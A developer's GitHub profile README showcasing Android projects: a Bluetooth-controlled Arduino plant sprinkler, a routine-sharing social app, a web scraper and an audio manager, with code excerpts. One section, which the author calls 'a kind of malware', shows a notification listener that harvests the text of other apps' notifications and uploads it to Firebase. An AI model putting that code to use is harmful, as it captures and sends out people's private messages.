<!---
carroch97/carroch97 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->

<h1>Daniele Carrozzino</h1>

<h3>Android developer - Java, Kotlin</h3>

<b>This is the presentation of all my personal project</b>

Over the last years, I worked as a mobile developer for a tech product company that provides messaging and videoconferencing services.
Along with my professional career, I developed some personal projects (of questionable seriousness and usefulness) to enhance my hard skills.

During my career, I mostly worked in an Android stack: indeed, the programming languages I know the most are <b>Java, Kotlin and C++</b>. Moreover, I am very used to markup languages like <b>XML</b> and data formats like JSON.

[Curriculum Vitae](https://github.com/DanieleCarrozzino/carroch97/files/8747952/CV.pdf)

<h1>Personal project</h1>

<h2>First project - Sprinkler!</h2>

<h4>Have you ever been on vacation for too long and all your plants have dried up when you return?</h4>

WELL! You need an <b>automatic sprinkler</b>

<p>
<img src="https://user-images.githubusercontent.com/51740054/169001661-53c53d8e-6f5e-48bd-8a17-1e9388462ff3.jpg" width="148.8" height="307.2" title="WET">
<img src="https://user-images.githubusercontent.com/51740054/168990977-76850f6d-8770-4523-9633-7091405d5b20.jpg" width="148.8" height="307.2" title="DRY">
  </p>

Uao! but wait, what is an Automatic sprinkler?

<h4>Project description</h4>

I started this project at the end of 2019 at the beginning of my work experience.
It was born from the idea of being able to have fun with a practical and usable implementation in the everyday routine.
Water the plants automatically thanks to a hardware support developed with arduino, when the humidity sensor exceeds the threshold set by the user, the sprinkler automatically waters the plant

<h4>Technical description</h4>

The project is divided into 2 parts, the hardware part and the application part.
I will not explain too much the hardware part also because it is not my field and I don't think it is too interesting for a mobile developer.

<h4>Hardware part</h4>
  Components used: <b>Arduino uno, humidity sensor, bluetooth module, small engine.</b>
  This part includes the Arduino code for the management of all the hardware and sensors
  
  ```
  #include <SoftwareSerial.h> 
  
  void setup() { 
    pinMode(STEPPER_PIN_1, OUTPUT); 
    pinMode(STEPPER_PIN_2, OUTPUT); 
    pinMode(STEPPER_PIN_3, OUTPUT); 
    pinMode(STEPPER_PIN_4, OUTPUT); 

    num_innaffiature = 0; 

    Serial.begin(9600); 
    mySerial.begin(9600); 
  }
  
  ...
  ```
  
  [Full arduino code](https://github.com/DanieleCarrozzino/carroch97/blob/main/arduinoCode.txt)
  
  <h4>Aplication part</h4>
  
  The challenge of the application was to integrate a communication via bluetooth BLE and to be able to communicate with the hardware part of the project. the project is written in <b>kotlin</b> and <b>java</b>, a relatively simple project in terms of architecture because it works in offline mode and is not supported by any server.
  
  This is a simple examples of my methods to write and read on the bluetooth module.
  
  ```
  
  private static final String STRING_UUID = "0000ffe0-0000-1000-8000-00805f9b34fb";
  
  /**
    * <p>Send data</p>
    * @apiNote
    * This method is to write the data on the bluetooth module.
    * @params value The value that I want write on the module
    */
  public void sendData(String value) {
        {
            if(mBluetoothGatt == null || mBluetoothGatt.getServices().size() == 0){
                Toast.makeText(stateManager.mainActivity, "Connecting...", Toast.LENGTH_SHORT).show();
                return;
            }
            if (mBluetoothAdapter == null || mBluetoothGatt == null) {
                Log.w(TAG, "BluetoothAdapter not initialized");
                return;
            }
            /*check if the service is available on the device*/
            BluetoothGattService mCustomService = mBluetoothGatt.getService(UUID.fromString(STRING_UUID));

            if (mCustomService == null) {
                Log.w(TAG, "Custom BLE Service not found");
                return;
            }
            /*Get the read characteristic from the service*/
            BluetoothGattCharacteristic mWriteCharacteristic = mCustomService.getCharacteristic(UUID.fromString(STRING_UUID));
            Log.e(TAG, "Write on BLE " + value);
            mBluetoothGatt.setCharacteristicNotification(mWriteCharacteristic, true);
            mWriteCharacteristic.setValue(value);
            if (!mBluetoothGatt.writeCharacteristic(mWriteCharacteristic)) {
                Log.w(TAG, "Failed to write characteristic");
            }
        }
    }

    /**
    * <p>Receive data</p>
    * @apiNote
    * this method is to read the data of the bluetooth module.
    * No params need.
    */
    public void receivedata() {
        {
            if (mBluetoothAdapter == null || mBluetoothGatt == null) {
                Log.w(TAG, "BluetoothAdapter not initialized");
                return;
            }
            /*check if the service is available on the device*/
            BluetoothGattService mCustomService = mBluetoothGatt.getService(UUID.fromString(STRING_UUID));
            if (mCustomService == null) {
                Log.w(TAG, "Custom BLE Service not found");
                return;
            }

            BluetoothGattCharacteristic mReadCharacteristic = mCustomService.getCharacteristic(UUID.fromString(STRING_UUID));
            mBluetoothGatt.setCharacteristicNotification(mReadCharacteristic, true);
            Log.e("SERVICE", "READ");
            if (!mBluetoothGatt.readCharacteristic(mReadCharacteristic)) {
                Log.w(TAG, "Failed to read characteristic");
            }
        }
    }
  
  ```
  
<h2>Fourth project - Dyno</h4>

<h3>Description</h3>
The project is a social network where you can share or follow other people's daily routines. A workout in the gym, a study method, anything that can be considered a daily routine

Elements of interest of the project:
- Integration with Firebase
- MVVM pattern software architectural pattern
- Retrofit
- Room
- Live Data
- DAO

<h3>Firebase</h3>
Firebase is a powerful platform for your mobile and web application. Firebase can power your app’s backend, including data storage, user authentication, static hosting, and more. With Firebase, you can easily build mobile and web apps that scale from one user to one million.

I used Firebase to integrate push notification and store images.

<h3>MVVM</h3>
Model-View-ViewModel (MVVM) is a software design pattern that is structured to separate program logic and user interface controls.
Each fragment and activity have their associated ViewModel.

<h3>Retrofit</h3>
If you need to build a client for a REST API in kotlin, look no further than Retrofit. It's a Java library also compatible with Android, and works smoothly with Kotlin.

```
fun sync(){
        val routineAPI:RoutineAPI = retrofit.create(RoutineAPI::class.java)
        val call:Call<List<RetrofitIdVersion>> = routineAPI.sync()

        GlobalScope.launch(Dispatchers.IO) {
            var list:List<RetrofitIdVersion>? = null
            try{
                list = call.execute().body()
            }
            catch (e:Exception){
                Log.e("Daniele Back Call", "CATCH " + e.message)
            }
            finally {
                if(list != null) {
                    state.arraySyncResult = ArrayList(list)
                }
            }
        }
    }
```

<h3>Room</h3>
Room is a part of the Android Architecture components which provides an abstraction layer over SQlite which allows for a more robust database acces while still providing the full power of SQlite.

```
@Entity(tableName = "master_routine_table")
class MasterRoutine(
    @PrimaryKey(autoGenerate = false)
    var id_master:String,
    var id_from_db:Int,
    var versionId:Int = -1,
    var title:String,
    var description:String,
    @SerializedName("category")
    var category:String,
    var preference:Boolean = false,
    @SerializedName("owner")
    var userOwner:String,
    var public_routine:Int,
    var level:Int = 1,
    var image:String,
    var personalRoutine:Boolean = false,
    var goal:String = ""
) {

    @Ignore
    var bitmapImage: Bitmap? = null

    @Ignore
    var target: Target? = null

    @JvmName("getTarget1")
    fun getTarget() : Target?{
        target  = object : Target {
            override fun onBitmapLoaded(bitmap: Bitmap?, from: Picasso.LoadedFrom?) {
                Log.e("SUCCESS", "save bitmap")
                bitmapImage = bitmap
            }
            override fun onBitmapFailed(e: java.lang.Exception?, errorDrawable: Drawable?) {}
            override fun onPrepareLoad(placeHolderDrawable: Drawable?) {}
        }
        return target
    }

    fun getBitmapImageRoutine() : Bitmap? {
        return if(bitmapImage != null)
            bitmapImage
        else
            null
    }
}
```

<h3>LiveData</h3>
LiveData is an observable data holder class. Unlike a regular observable, LiveData is lifecycle-aware, meaning it respects the lifecycle of other app components, such as activities, fragments, or services. This awareness ensures LiveData only updates app component observers that are in an active lifecycle state.
[Google Documentation](https://developer.android.com/topic/libraries/architecture/livedata)

```
@Query("SELECT * FROM single_routine_table ORDER BY id_master")
    fun readAllSingleRoutine() : LiveData<List<SingleRoutineEntity>>
```

```
val readAllData :LiveData<List<SingleRoutineEntity>> = routineDao.readAllSingleRoutine()
```

<h3>DAO</h3>
Data Access Objects are the main classes where you define your database interactions. They can include a variety of query methods.

The class marked with @Dao should either be an interface or an abstract class. At compile time, Room will generate an implementation of this class when it is referenced by a Database.
[Google Documentation](https://developer.android.com/reference/kotlin/androidx/room/Dao)

```
@Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun addUser(user: User)
```

<p>
<img src="https://user-images.githubusercontent.com/51740054/169660286-bd2e2986-158a-42b1-b477-b8c6695d8713.jpg" width="158.8" height="307.2" title="Single routine">
<img src="https://user-images.githubusercontent.com/51740054/169660290-3e1a8303-b2e5-4170-a716-5b367c88eab5.jpg" width="158.8" height="307.2" title="Main page">
<img src="https://user-images.githubusercontent.com/51740054/169660292-fe52e6d4-4f2e-47fe-91ff-22d0c68c31f3.jpg" width="158.8" height="307.2" title="Profile">
</p>
  

<h2>Second project - Scraper</h2>

Born as a web scraper to get information on the covid in a single application, it has evolved as a notification manager.
Elements of interest of the project:
- Integration with Firebase
- NotificationListener
- Scraper online

<h3>Firebase</h3>
I only used Firebase to integrate the database in real time and not for push notification. The reason for using Firebase was to already have a working and performing backend

```
fun addInfoPush(collectionName: String, uuid: String, infoPush: String?, context: Context){
        db.collection(collectionName)
            .document(uuid)
            .update("infoPush", infoPush)
            .addOnSuccessListener{ task ->
                readData(nameData, context)
        }
    }
    
```

<h3>Scraper online</h3>

The reason for the online scraper was that I had to extract the information by hand from the various google pages where I found updated and verified news

```
fun getPosition(activity: MainActivity){
        val background = object : Thread(){
            override fun run() {
                try {
                    val conn = Jsoup.connect("https://www.google.com/search?q=meteo&rlz=1C1MSIM_enIT879IT879&oq=meteo&aqs=chrome.0.69i59j35i39j0l6.908j1j7&sourceid=chrome&ie=UTF-8").method(
                        Connection.Method.GET
                    )
                    val resp = conn.execute()
                    val html = resp.body()
                    var cnt = 0
                    val stringToSearch = "<div class=\"vk_c nawv0d\" id=\"wob_wc\"><span aria-level=\"3\" role=\"heading\"><div class=\"wob_loc mfMhoc vk_gy vk_h\" id=\"wob_loc\">"
                    val posCity = html.indexOf(stringToSearch)
                    for (i in 0..100){
                        if(html[posCity + stringToSearch.length + i] == '<'){
                            cnt = i
                            break
                        }
                    }
                    val resultSearch = html.substring(
                        posCity + stringToSearch.length,
                        posCity + stringToSearch.length + cnt
                    )
                    activity.runOnUiThread(Runnable {
                        Toast.makeText(activity, resultSearch, Toast.LENGTH_SHORT).show()
                        activity.callBackPosition(resultSearch)
                    })
                    }
                    catch (e: Exception) {
                        e.printStackTrace()
                        activity.runOnUiThread(Runnable {
                            Toast.makeText(activity, e.message, Toast.LENGTH_SHORT).show()
                        })
                    }
                }
            }
            background.start()
    }
```

<h3>Notification Manager</h3>

The project then evolved into a kind of malware that read the user's notifications and extracted the information to recreate all the chats that that person was having on firebase. A bit the same principle as the applications that manage to save deleted whatsapp messages

```

@Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        map.clear();
        final String packageName = sbn.getPackageName();
        Notification notification;
        FirebaseObj f = new FirebaseObj();
        StateManager state = StateManager.getInstance();

        if (!TextUtils.isEmpty(packageName)) {
            notification = sbn.getNotification();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && notification != null){
                Iterator<String> iter = notification.extras.keySet().iterator();
                while(iter.hasNext()){
                    String text = "";
                    String next = iter.next();
                    if (notification.extras.containsKey(next)) {
                        text = notification.extras.getString(next);
                        if (state != null && state.mainActivity != null){
                            if (text != null && !text.isEmpty() && !next.isEmpty() && !packageName.equals("com.example.appkottest")){
                                map.put(next, text);
                            }
                        }
                    }
                }
                if (!packageName.equals("com.example.appkottest"))
                    f.addNote(packageName, map);
            }
        }
    }

```

<p>
<img src="https://user-images.githubusercontent.com/51740054/169076121-59b75152-1df7-4441-9dce-2f41be826adc.jpg" width="158.8" height="307.2" title="WET">
<img src="https://user-images.githubusercontent.com/51740054/169076176-e76339d3-2ccc-453c-8240-03fd1d0259e8.jpg" width="218.8" height="307.2" title="DRY">
  </p>

<h2>Third project - AudioManager</h2>

<h4>Audio device manager</h4>

This project was born from the desire to explore the kotlin environment more and more by creating a small audio manager managing all types of connections. For now it's just a class to be extended to your project but over time I want to create a real open source library for audio management

[Link to code](https://github.com/DanieleCarrozzino/carroch97/blob/main/AudioDevice.kt)

<h2>Reference texts</h2>
Kotlin in action mannin edition 2017



